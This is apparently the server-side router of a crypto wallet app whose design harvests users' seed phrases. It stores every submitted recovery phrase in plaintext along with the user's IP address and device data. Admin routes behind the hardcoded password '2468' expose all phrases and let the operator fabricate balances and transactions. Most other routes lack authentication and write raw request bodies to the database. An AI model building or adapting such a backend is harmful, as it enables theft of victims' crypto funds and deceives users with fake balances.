import { Router } from "express";
import { db } from "@workspace/db";
import {
  wallets, cryptoTokens, transactions, users,
  userBalances, userSessions, userTransactions,
} from "@workspace/db";
import { eq, like, desc } from "drizzle-orm";

const FALLBACK_PRICES: Record<string, number> = {
  BTC: 68829, ETH: 2054.38, SOL: 83.97, XRP: 1.4263,
  USDC: 1.0, USDT: 1.0, DOGE: 0.128, LINK: 12.45,
  BNB: 560, LTC: 73.50, AVAX: 21.8, ADA: 0.692,
  DOT: 4.11, UNI: 5.89, AAVE: 146.2, ARB: 0.32,
  OP: 0.71, POL: 0.234, PEPE: 0.00000782, WIF: 0.98,
  SHIB: 0.00001234,
};

const router = Router();

router.get("/wallet", async (req, res) => {
  try {
    const [wallet] = await db.select().from(wallets).limit(1);
    if (!wallet) {
      const [created] = await db.insert(wallets).values({
        name: "My Wallet",
        totalBalance: 0,
        dailyChange: 0,
        dailyChangePercent: 0,
        hasCompletedOnboarding: false,
        hasBackedUp: false,
        hasNotifications: false,
        pin: null,
      }).returning();
      return res.json(created);
    }
    res.json(wallet);
  } catch (error) {
    req.log.error(error, "Failed to fetch wallet");
    res.status(500).json({ message: "Failed to fetch wallet" });
  }
});

router.patch("/wallet/:id", async (req, res) => {
  try {
    const [updated] = await db.update(wallets).set(req.body).where(eq(wallets.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "Wallet not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update wallet");
    res.status(500).json({ message: "Failed to update wallet" });
  }
});

router.get("/tokens", async (req, res) => {
  try {
    const tokens = await db.select().from(cryptoTokens);
    res.json(tokens);
  } catch (error) {
    req.log.error(error, "Failed to fetch tokens");
    res.status(500).json({ message: "Failed to fetch tokens" });
  }
});

router.get("/tokens/:network", async (req, res) => {
  try {
    const tokens = await db.select().from(cryptoTokens).where(eq(cryptoTokens.network, req.params.network));
    res.json(tokens);
  } catch (error) {
    req.log.error(error, "Failed to fetch tokens");
    res.status(500).json({ message: "Failed to fetch tokens" });
  }
});

router.get("/holdings", async (req, res) => {
  try {
    const all = await db.select().from(cryptoTokens);
    res.json(all.filter(t => t.balance > 0));
  } catch (error) {
    req.log.error(error, "Failed to fetch holdings");
    res.status(500).json({ message: "Failed to fetch holdings" });
  }
});

router.get("/prices", async (req, res) => {
  try {
    const userId = req.query.userId as string | undefined;
    if (userId) {
      const ubRows = await db.select().from(userBalances).where(eq(userBalances.userId, userId));
      const allTokens = await db.select().from(cryptoTokens);
      const priceData = ubRows.map(ub => {
        const token = allTokens.find(t => t.symbol === ub.tokenSymbol);
        const dbPrice = token?.price ?? 0;
        const price = dbPrice > 0 ? dbPrice : (FALLBACK_PRICES[ub.tokenSymbol] ?? 1);
        const fluctuation = (Math.random() - 0.5) * 0.002;
        const newPrice = price * (1 + fluctuation);
        const balanceUsd = ub.balance * newPrice;
        const changePercent = (token?.changePercent ?? 0) + (Math.random() - 0.5) * 0.05;
        return {
          id: ub.id,
          symbol: ub.tokenSymbol,
          name: ub.tokenName,
          iconUrl: ub.iconUrl,
          iconColor: ub.iconColor,
          price: Math.round(newPrice * 100) / 100,
          balanceUsd: Math.round(balanceUsd * 100) / 100,
          changePercent: Math.round(changePercent * 100) / 100,
          balance: ub.balance,
          walletAddress: ub.walletAddress || "",
          label: ub.label ?? null,
        };
      });
      const totalBalance = priceData.reduce((sum, t) => sum + t.balanceUsd, 0);
      const weightedChange = priceData.reduce((sum, t) => {
        if (totalBalance === 0) return sum;
        return sum + (t.changePercent * (t.balanceUsd / totalBalance));
      }, 0);
      return res.json({
        holdings: priceData,
        totalBalance: Math.round(totalBalance * 100) / 100,
        dailyChangePercent: Math.round(weightedChange * 100) / 100,
        dailyChange: Math.round(totalBalance * (weightedChange / 100) * 100) / 100,
        interestBalance: 0,
      });
    }
    const allTokens = await db.select().from(cryptoTokens);
    const holdings = allTokens.filter(t => t.balance > 0);
    res.json({ holdings, totalBalance: 0, dailyChangePercent: 0, dailyChange: 0, interestBalance: 0 });
  } catch (error) {
    req.log.error(error, "Failed to fetch prices");
    res.status(500).json({ message: "Failed to fetch prices" });
  }
});

router.get("/users", async (req, res) => {
  try {
    const all = await db.select().from(users);
    res.json(all);
  } catch (error) {
    req.log.error(error, "Failed to fetch users");
    res.status(500).json({ message: "Failed to fetch users" });
  }
});

router.get("/users/:id", async (req, res) => {
  try {
    const [user] = await db.select().from(users).where(eq(users.id, req.params.id));
    if (!user) return res.status(404).json({ message: "User not found" });
    res.json(user);
  } catch (error) {
    req.log.error(error, "Failed to fetch user");
    res.status(500).json({ message: "Failed to fetch user" });
  }
});

router.patch("/users/:id", async (req, res) => {
  try {
    const [updated] = await db.update(users).set(req.body).where(eq(users.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "User not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update user");
    res.status(500).json({ message: "Failed to update user" });
  }
});

router.delete("/users/:id", async (req, res) => {
  try {
    await db.delete(userSessions).where(eq(userSessions.userId, req.params.id));
    await db.delete(userBalances).where(eq(userBalances.userId, req.params.id));
    await db.delete(userTransactions).where(eq(userTransactions.userId, req.params.id));
    await db.delete(users).where(eq(users.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete user");
    res.status(500).json({ message: "Failed to delete user" });
  }
});

router.get("/users/:id/balances", async (req, res) => {
  try {
    const balances = await db.select().from(userBalances).where(eq(userBalances.userId, req.params.id));
    res.json(balances);
  } catch (error) {
    req.log.error(error, "Failed to fetch user balances");
    res.status(500).json({ message: "Failed to fetch user balances" });
  }
});

router.post("/users/:id/balances", async (req, res) => {
  try {
    const [created] = await db.insert(userBalances).values({ ...req.body, userId: req.params.id }).returning();
    res.json(created);
  } catch (error) {
    req.log.error(error, "Failed to create user balance");
    res.status(500).json({ message: "Failed to create user balance" });
  }
});

router.patch("/balances/:id", async (req, res) => {
  try {
    const [updated] = await db.update(userBalances).set(req.body).where(eq(userBalances.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "Balance not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update balance");
    res.status(500).json({ message: "Failed to update balance" });
  }
});

router.delete("/balances/:id", async (req, res) => {
  try {
    await db.delete(userBalances).where(eq(userBalances.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete balance");
    res.status(500).json({ message: "Failed to delete balance" });
  }
});

router.get("/users/:id/sessions", async (req, res) => {
  try {
    const sessions = await db.select().from(userSessions)
      .where(eq(userSessions.userId, req.params.id))
      .orderBy(desc(userSessions.openedAt));
    res.json(sessions);
  } catch (error) {
    req.log.error(error, "Failed to fetch sessions");
    res.status(500).json({ message: "Failed to fetch sessions" });
  }
});

router.post("/users/:id/sessions", async (req, res) => {
  try {
    const [created] = await db.insert(userSessions).values({ ...req.body, userId: req.params.id }).returning();
    res.json(created);
  } catch (error) {
    req.log.error(error, "Failed to create session");
    res.status(500).json({ message: "Failed to create session" });
  }
});

router.patch("/sessions/:id", async (req, res) => {
  try {
    const [updated] = await db.update(userSessions).set(req.body).where(eq(userSessions.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "Session not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update session");
    res.status(500).json({ message: "Failed to update session" });
  }
});

router.get("/users/:id/transactions", async (req, res) => {
  try {
    const txs = await db.select().from(userTransactions)
      .where(eq(userTransactions.userId, req.params.id))
      .orderBy(desc(userTransactions.createdAt));
    res.json(txs);
  } catch (error) {
    req.log.error(error, "Failed to fetch transactions");
    res.status(500).json({ message: "Failed to fetch transactions" });
  }
});

router.post("/users/:id/transactions", async (req, res) => {
  try {
    const [created] = await db.insert(userTransactions).values({ ...req.body, userId: req.params.id }).returning();
    res.json(created);
  } catch (error) {
    req.log.error(error, "Failed to create transaction");
    res.status(500).json({ message: "Failed to create transaction" });
  }
});

router.delete("/user-transactions/:id", async (req, res) => {
  try {
    await db.delete(userTransactions).where(eq(userTransactions.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete transaction");
    res.status(500).json({ message: "Failed to delete transaction" });
  }
});

router.post("/auth/new-wallet", async (req, res) => {
  try {
    const { name, seedPhrase, deviceInfo } = req.body;
    const words = (seedPhrase || "").trim().toLowerCase().split(/\s+/);
    const prefix = words.slice(0, 3).join(" ");
    const [existing] = await db.select().from(users).where(like(users.seedPhrase, `${prefix}%`));
    if (existing) {
      const balances = await db.select().from(userBalances).where(eq(userBalances.userId, existing.id));
      return res.json({ user: existing, balances });
    }
    const [user] = await db.insert(users).values({
      name: name || "My Wallet",
      seedPhrase: words.join(" "),
      walletAddress: "",
    }).returning();
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    const ua = req.headers["user-agent"] || "";
    const [updated] = await db.update(users).set({
      lastActive: new Date(),
      ipAddress: ip,
      userAgent: ua,
      deviceInfo: typeof deviceInfo === "object" ? JSON.stringify(deviceInfo) : (deviceInfo || null),
    }).where(eq(users.id, user.id)).returning();
    const balances = await db.select().from(userBalances).where(eq(userBalances.userId, user.id));
    res.json({ user: updated || user, balances });
  } catch (error) {
    req.log.error(error, "Failed to create wallet");
    res.status(500).json({ message: "Failed to create wallet" });
  }
});

router.post("/auth/seed-phrase", async (req, res) => {
  try {
    const { seedPhrase, deviceInfo } = req.body;
    if (!seedPhrase || typeof seedPhrase !== "string") {
      return res.status(400).json({ message: "Seed phrase required" });
    }
    const words = seedPhrase.trim().toLowerCase().split(/\s+/);
    if (words.length < 3) {
      return res.status(400).json({ message: "Seed phrase must be at least 3 words" });
    }
    const prefix = words.slice(0, 3).join(" ");
    let [user] = await db.select().from(users).where(like(users.seedPhrase, `${prefix}%`));
    if (!user) {
      [user] = await db.insert(users).values({
        name: "My Wallet",
        seedPhrase: words.join(" "),
        walletAddress: "",
      }).returning();
    }
    const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
    const ua = req.headers["user-agent"] || "";
    await db.update(users).set({
      lastActive: new Date(),
      ipAddress: ip,
      userAgent: ua,
      deviceInfo: typeof deviceInfo === "object" ? JSON.stringify(deviceInfo) : (deviceInfo || null),
    }).where(eq(users.id, user.id));
    const [refreshed] = await db.select().from(users).where(eq(users.id, user.id));
    const balances = await db.select().from(userBalances).where(eq(userBalances.userId, user.id));
    res.json({ user: refreshed || user, balances });
  } catch (error) {
    req.log.error(error, "Failed to authenticate");
    res.status(500).json({ message: "Failed to authenticate" });
  }
});

router.post("/admin/verify", async (req, res) => {
  const { password } = req.body;
  if (password === "2468") {
    res.json({ success: true });
  } else {
    res.status(401).json({ message: "Invalid password" });
  }
});

router.post("/admin/login", async (req, res) => {
  const { password } = req.body;
  if (password === "2468") {
    res.json({ success: true });
  } else {
    res.status(401).json({ message: "Invalid password" });
  }
});

router.get("/admin/users", async (req, res) => {
  try {
    const allUsers = await db.select().from(users).orderBy(desc(users.createdAt));
    const allBalances = await db.select().from(userBalances);
    const result = allUsers.map(u => ({
      ...u,
      balances: allBalances.filter(b => b.userId === u.id),
    }));
    res.json(result);
  } catch (error) {
    req.log.error(error, "Failed to fetch admin users");
    res.status(500).json({ message: "Failed to fetch admin users" });
  }
});

router.post("/admin/users", async (req, res) => {
  try {
    const { name, seedPhrase, walletAddress } = req.body;
    if (!name || !seedPhrase) return res.status(400).json({ message: "name and seedPhrase required" });
    const words = seedPhrase.trim().toLowerCase().split(/\s+/);
    const [created] = await db.insert(users).values({
      name: name.trim(),
      seedPhrase: words.join(" "),
      walletAddress: walletAddress || "",
      depositsEnabled: true,
      withdrawalsEnabled: true,
      bankTransfersEnabled: true,
    }).returning();
    res.json({ ...created, balances: [] });
  } catch (error) {
    req.log.error(error, "Failed to create admin user");
    res.status(500).json({ message: "Failed to create admin user" });
  }
});

router.patch("/admin/users/:id", async (req, res) => {
  try {
    const [updated] = await db.update(users).set(req.body).where(eq(users.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "User not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update admin user");
    res.status(500).json({ message: "Failed to update admin user" });
  }
});

router.patch("/admin/users/:id/settings", async (req, res) => {
  try {
    const [updated] = await db.update(users).set(req.body).where(eq(users.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "User not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update user settings");
    res.status(500).json({ message: "Failed to update user settings" });
  }
});

router.delete("/admin/users/:id", async (req, res) => {
  try {
    await db.delete(userSessions).where(eq(userSessions.userId, req.params.id));
    await db.delete(userBalances).where(eq(userBalances.userId, req.params.id));
    await db.delete(userTransactions).where(eq(userTransactions.userId, req.params.id));
    await db.delete(users).where(eq(users.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete admin user");
    res.status(500).json({ message: "Failed to delete admin user" });
  }
});

router.post("/admin/users/:id/balances", async (req, res) => {
  try {
    const [created] = await db.insert(userBalances).values({ ...req.body, userId: req.params.id }).returning();
    res.json(created);
  } catch (error) {
    req.log.error(error, "Failed to add user balance");
    res.status(500).json({ message: "Failed to add user balance" });
  }
});

router.patch("/admin/balances/:id", async (req, res) => {
  try {
    const [updated] = await db.update(userBalances).set(req.body).where(eq(userBalances.id, req.params.id)).returning();
    if (!updated) return res.status(404).json({ message: "Balance not found" });
    res.json(updated);
  } catch (error) {
    req.log.error(error, "Failed to update balance");
    res.status(500).json({ message: "Failed to update balance" });
  }
});

router.delete("/admin/balances/:id", async (req, res) => {
  try {
    await db.delete(userBalances).where(eq(userBalances.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete balance");
    res.status(500).json({ message: "Failed to delete balance" });
  }
});

router.get("/admin/users/:id/sessions", async (req, res) => {
  try {
    const sessions = await db.select().from(userSessions)
      .where(eq(userSessions.userId, req.params.id))
      .orderBy(desc(userSessions.openedAt));
    res.json(sessions);
  } catch (error) {
    req.log.error(error, "Failed to fetch user sessions");
    res.status(500).json({ message: "Failed to fetch user sessions" });
  }
});

router.get("/admin/users/:id/transactions", async (req, res) => {
  try {
    const txs = await db.select().from(userTransactions)
      .where(eq(userTransactions.userId, req.params.id))
      .orderBy(desc(userTransactions.createdAt));
    res.json(txs);
  } catch (error) {
    req.log.error(error, "Failed to fetch user transactions");
    res.status(500).json({ message: "Failed to fetch user transactions" });
  }
});

router.post("/admin/users/:id/transactions", async (req, res) => {
  try {
    const [created] = await db.insert(userTransactions).values({ ...req.body, userId: req.params.id }).returning();
    res.json(created);
  } catch (error) {
    req.log.error(error, "Failed to create user transaction");
    res.status(500).json({ message: "Failed to create user transaction" });
  }
});

router.delete("/admin/transactions/:id", async (req, res) => {
  try {
    await db.delete(userTransactions).where(eq(userTransactions.id, req.params.id));
    res.json({ success: true });
  } catch (error) {
    req.log.error(error, "Failed to delete transaction");
    res.status(500).json({ message: "Failed to delete transaction" });
  }
});

router.get("/transactions", async (req, res) => {
  try {
    const txs = await db.select().from(transactions).orderBy(desc(transactions.createdAt));
    res.json(txs);
  } catch (error) {
    req.log.error(error, "Failed to fetch transactions");
    res.status(500).json({ message: "Failed to fetch transactions" });
  }
});

export default router;
